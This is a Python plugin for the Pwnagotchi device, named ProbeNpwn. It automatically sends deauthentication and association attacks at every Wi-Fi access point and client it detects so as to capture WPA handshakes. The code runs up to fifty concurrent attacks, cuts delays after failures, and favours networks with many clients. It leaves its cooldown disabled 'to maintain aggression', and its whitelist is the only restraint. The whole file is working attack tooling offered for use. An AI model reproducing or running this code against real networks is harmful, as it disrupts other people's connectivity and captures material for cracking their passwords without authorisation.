import logging
import time
import threading
import os
import subprocess
import random
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components
from concurrent.futures import ThreadPoolExecutor

class ProbeNpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.1.3'  # Updated to reflect enhancements
    __license__ = 'GPL3'
    __description__ = (
        'Aggressively capture handshakes by launching immediate associate and deauth attacks '
        'on detected devices. Features minimized delays, retry mechanisms, target prioritization, '
        'concurrency throttling, and channel coordination for maximum efficiency.'
    )

    def __init__(self):
        logging.debug("ProbeNpwn plugin created")
        self.old_name = None
        self.recents = {}  # Track recent APs and clients
        self.executor = ThreadPoolExecutor(max_workers=50)  # Throttle to 50 concurrent attacks (Enhancement 4)
        self._watchdog_thread = None
        self._watchdog_thread_running = True
        self.attack_attempts = {}  # Track attack attempts per AP
        self.success_counts = {}  # Track successful handshakes per AP
        self.total_handshakes = 0
        self.failed_handshakes = 0
        self.performance_stats = {}
        self.whitelist = set()
        self.cooldowns = {}  # Cooldown periods per AP after handshake
        self.epoch_duration = 60  # Default epoch duration in seconds
        self.ap_clients = {}  # Track number of clients per AP for prioritization (Enhancement 3)
        # UI-related attributes
        self.attacks_x = 10
        self.attacks_y = 20
        self.success_x = 10
        self.success_y = 30
        self.ui_initialized = False

    def on_loaded(self):
        """Log plugin load event."""
        logging.info("Plugin ProbeNpwn loaded")

    def on_config_changed(self, config):
        """Load whitelist, verbose setting, and UI coordinates from config."""
        self.whitelist = set(config["main"].get("whitelist", []))
        logging.info(f"Whitelist loaded from config: {self.whitelist}")

        self.verbose = config.get("main", {}).get("plugins", {}).get("probenpwn", {}).get("verbose", False)
        if self.verbose:
            logging.getLogger().setLevel(logging.INFO)
            logging.info("Verbose mode enabled, logging level set to INFO")
        else:
            logging.getLogger().setLevel(logging.WARNING)
            logging.warning("Verbose mode disabled, logging level set to WARNING")

        self.old_name = config.get("main").get("name", "")
        self.attacks_x = config.get("main.plugins.probenpwn.attacks_x_coord", 10)
        self.attacks_y = config.get("main.plugins.probenpwn.attacks_y_coord", 20)
        self.success_x = config.get("main.plugins.probenpwn.success_x_coord", 10)
        self.success_y = config.get("main.plugins.probenpwn.success_y_coord", 30)

    def on_unload(self, ui):
        """Clean up on unload: restore name, stop watchdog, shutdown thread pool, remove UI elements."""
        with ui._lock:
            if self.old_name:
                ui.set('name', f"{self.old_name}>")
            ui.remove_element('attacks')
            ui.remove_element('success')

        self._watchdog_thread_running = False
        if self._watchdog_thread:
            self._watchdog_thread.join()
        self.executor.shutdown(wait=True)
        logging.info("Probing out.")

    def on_ui_setup(self, ui):
        """Set up custom UI elements for attacks and success rate."""
        if not self.ui_initialized:
            ui.add_element('attacks', components.Text(
                position=(self.attacks_x, self.attacks_y),
                value='Attacks: 0',
                color=255
            ))
            ui.add_element('success', components.Text(
                position=(self.success_x, self.success_y),
                value='Success: 0.0%',
                color=255
            ))
            logging.info("Custom UI elements 'attacks' and 'success' initialized.")
            self.ui_initialized = True

    def on_ui_update(self, ui):
        """Update UI with current attack counts and success rate."""
        total_attempts = sum(self.attack_attempts.values())
        total_successes = sum(self.success_counts.values())
        success_rate = (total_successes / total_attempts) * 100 if total_attempts > 0 else 0.0

        with ui._lock:
            ui.set('attacks', f"Attacks: {total_attempts}")
            ui.set('success', f"Success: {success_rate:.1f}%")

    def on_ready(self, agent):
        """Start watchdog and set initial status on agent ready."""
        logging.info("Probed and Pwnd!")
        agent.run("wifi.clear")
        self._watchdog_thread = threading.Thread(target=self._watchdog, daemon=True)
        self._watchdog_thread.start()
        with agent._view._lock:
            agent._view.set("status", "Probe engaged... \nPWNing your signals, Earthlings!")

    def _watchdog(self):
        """Monitor system health and attempt recovery before restarting service."""
        CHECK_INTERVAL = 5
        MAX_RETRIES = 1
        retry_count = 0
        while self._watchdog_thread_running:
            if not os.path.exists("/sys/class/net/wlan0mon"):
                logging.error("wlan0mon missing! Attempting Wi-Fi restart...")
                try:
                    subprocess.run(["ip", "link", "set", "wlan0mon", "down"], check=True)
                    subprocess.run(["ip", "link", "set", "wlan0mon", "up"], check=True)
                    logging.info("Wi-Fi interface restarted.")
                    retry_count = 0
                except Exception as e:
                    retry_count += 1
                    if retry_count >= MAX_RETRIES:
                        logging.error(f"Wi-Fi restart failed after {MAX_RETRIES} attempts: {e}. Restarting Pwnagotchi...")
                        subprocess.run(["systemctl", "restart", "pwnagotchi"])
                        break
                    else:
                        logging.warning(f"Wi-Fi restart attempt {retry_count} failed: {e}. Retrying in {CHECK_INTERVAL} seconds...")
            else:
                retry_count = 0
            time.sleep(CHECK_INTERVAL)

    def track_recent(self, ap, cl=None):
        """Track recently seen APs and clients with timestamps."""
        ap['_track_time'] = time.time()
        self.recents[ap['mac'].lower()] = ap
        if cl:
            cl['_track_time'] = ap['_track_time']
            self.recents[cl['mac'].lower()] = cl

    def ok_to_attack(self, agent, ap):
        """Check if an AP or client is safe to attack (not whitelisted)."""
        if ap.get('hostname', '').lower() in self.whitelist or ap['mac'].lower() in self.whitelist:
            return False
        return True

    def attack_target(self, agent, ap, cl):
        """Launch attack on target AP/client with dynamic parameters."""
        ap_mac = ap['mac'].lower()
        if ap_mac in self.cooldowns and time.time() < self.cooldowns[ap_mac]:
            logging.debug(f"AP {ap_mac} on cooldown. Skipping attack.")
            return

        if not self.ok_to_attack(agent, ap):
            return

        # Ensure channel is set before attack (Enhancement 5)
        agent.set_channel(ap['channel'])

        self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1
        logging.info(f"Attacking AP {ap['mac']} and client {cl['mac'] if cl else 'N/A'}; attempt {self.attack_attempts[ap_mac]}")

        self.adjust_attack_parameters(ap_mac)

        if cl and agent._config['personality']['deauth']:
            delay = self.dynamic_attack_delay(ap, cl)
            agent.deauth(ap, cl, delay)
        if agent._config['personality']['associate']:
            agent.associate(ap, 0.1)  # Reduced delay for faster association (Enhancement 1)

    def dynamic_attack_delay(self, ap, cl):
        """Calculate adaptive delay with minimized values and retry mechanism (Enhancements 1 & 2)."""
        signal = cl.get('signal', -100) if cl else -100
        base_delay = 0.1 if signal >= -60 else 0.2  # Minimized base delays (Enhancement 1)

        ap_mac = ap['mac'].lower()
        attempts = self.attack_attempts.get(ap_mac, 0)
        # Retry mechanism: reduce delay aggressively after failed attempts (Enhancement 2)
        if attempts > 5:
            base_delay *= 0.4  # 40% of base delay after 5 attempts
        elif attempts > 2:
            base_delay *= 0.6  # 60% of base delay after 2 attempts

        # Prioritize APs with more clients by further reducing delay (Enhancement 3)
        num_clients = self.ap_clients.get(ap_mac, 0)
        if num_clients > 3:  # High-value target with >3 clients
            base_delay *= 0.8

        randomized_delay = base_delay * random.uniform(0.9, 1.1)
        logging.debug(f"Dynamic delay for AP {ap['mac']} (signal {signal}dBm, {attempts} attempts, {num_clients} clients): {randomized_delay:.3f}s")
        return randomized_delay

    def adjust_attack_parameters(self, ap_mac):
        """Tune attack aggression based on adaptive success thresholds."""
        success_count = self.success_counts.get(ap_mac, 0)
        attack_count = self.attack_attempts.get(ap_mac, 0)
        success_rate = (success_count / attack_count) * 100 if attack_count > 0 else 0

        total_success = sum(self.success_counts.values())
        total_attempts = sum(self.attack_attempts.values())
        avg_success_rate = (total_success / total_attempts) * 100 if total_attempts > 0 else 0

        low_threshold = avg_success_rate * 0.5  # 50% of average
        high_threshold = avg_success_rate * 1.5  # 150% of average

        if success_rate < low_threshold:
            logging.info(f"Low success rate ({success_rate:.2f}%) on {ap_mac}. Increasing aggression.")
            self.attack_attempts[ap_mac] += 5
        elif success_rate > high_threshold:
            logging.info(f"High success rate ({success_rate:.2f}%) on {ap_mac}. Reducing aggression.")
            self.attack_attempts[ap_mac] = max(1, self.attack_attempts[ap_mac] - 2)

    def on_bcap_wifi_ap_new(self, agent, event):
        """Handle new AP detection with immediate attack."""
        try:
            ap = event['data']
            ap_mac = ap['mac'].lower()
            self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0)  # Initialize client count (Enhancement 3)
            if self.ok_to_attack(agent, ap):
                logging.info(f"ProbeNpwn: Targeting new AP {ap.get('hostname', 'Unknown AP')} ({ap['mac']})")
                self.executor.submit(self.attack_target, agent, ap, None)
            else:
                logging.debug(f"ProbeNpwn: Skipping new AP {ap.get('hostname', 'Unknown AP')} ({ap['mac']}) - whitelisted or invalid")
        except Exception as e:
            logging.error(f"ProbeNpwn: Error in on_bcap_wifi_ap_new: {repr(e)}")

    def on_bcap_wifi_client_new(self, agent, event):
        """Handle new client detection with immediate deauth attack."""
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            ap_mac = ap['mac'].lower()
            # Increment client count for prioritization (Enhancement 3)
            self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
            if self.ok_to_attack(agent, ap) and self.ok_to_attack(agent, cl):
                logging.info(f"ProbeNpwn: Targeting new client {cl.get('hostname', 'Unknown Client')} ({cl['mac']}) on AP {ap.get('hostname', 'Unknown AP')} ({ap['mac']})")
                self.executor.submit(self.attack_target, agent, ap, cl)
            else:
                logging.debug(f"ProbeNpwn: Skipping new client {cl.get('hostname', 'Unknown Client')} ({cl['mac']}) on AP {ap.get('hostname', 'Unknown AP')} ({ap['mac']}) - whitelisted or invalid")
        except Exception as e:
            logging.error(f"ProbeNpwn: Error in on_bcap_wifi_client_new: {repr(e)}")

    def on_handshake(self, agent, filename, ap, cl):
        """Handle successful handshake capture with cooldown and log success rate."""
        ap_mac = ap['mac'].lower()
        logging.info(f"Handshake captured from {ap['mac']}")
        self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
        self.total_handshakes += 1

        attempts = self.attack_attempts.get(ap_mac, 0)
        if attempts > 0:
            success_rate = 100.0 / attempts
            logging.info(f"Success rate for handshake from {ap['mac']}: {success_rate:.2f}% (took {attempts} attempts)")
        else:
            logging.info(f"Handshake captured from {ap['mac']} with no recorded attempts.")

        if ap_mac in self.attack_attempts:
            del self.attack_attempts[ap_mac]

        # Cooldown logic commented out to maintain aggression
        # self.cooldowns[ap_mac] = time.time() + 5

        if 'mac' in ap and 'mac' in cl:
            logging.info(f"Captured handshake: {ap.get('hostname', 'Unknown AP')} ({ap['mac']}) -> "
                         f"'{cl.get('hostname', 'Unknown Client')}' ({cl['mac']}) ({cl['vendor']})")
            if ap_mac in self.recents:
                del self.recents[ap_mac]
            cl_mac = cl['mac'].lower()
            if cl_mac in self.recents:
                del self.recents[cl_mac]

    def on_epoch(self, agent, epoch, epoch_data):
        """Clean up old entries in recents based on epoch duration."""
        for mac in list(self.recents):
            if self.recents[mac]['_track_time'] < (time.time() - (self.epoch_duration * 2)):
                del self.recents[mac]

    def on_bcap_wifi_ap_updated(self, agent, event):
        """Track updated APs."""
        try:
            ap = event['data']
            if self.ok_to_attack(agent, ap):
                logging.debug(f"AP updated: {ap.get('hostname', 'Unknown AP')} ({ap['mac']})")
                self.track_recent(ap)
        except Exception as e:
            logging.error(f"Error in on_bcap_wifi_ap_updated: {repr(e)}")

    def on_bcap_wifi_client_updated(self, agent, event):
        """Track updated clients."""
        try:
            ap = event['data']['AP']
            cl = event['data']['Client']
            ap_mac = ap['mac'].lower()
            self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1  # Update client count (Enhancement 3)
            if self.ok_to_attack(agent, ap) and self.ok_to_attack(agent, cl):
                logging.debug(f"Client updated: {ap.get('hostname', 'Unknown AP')} ({ap['mac']}) -> "
                              f"'{cl.get('hostname', 'Unknown Client')}' ({cl['mac']}) ({cl['vendor']})")
                self.track_recent(ap, cl)
        except Exception as e:
            logging.error(f"Error in on_bcap_wifi_client_updated: {repr(e)}")
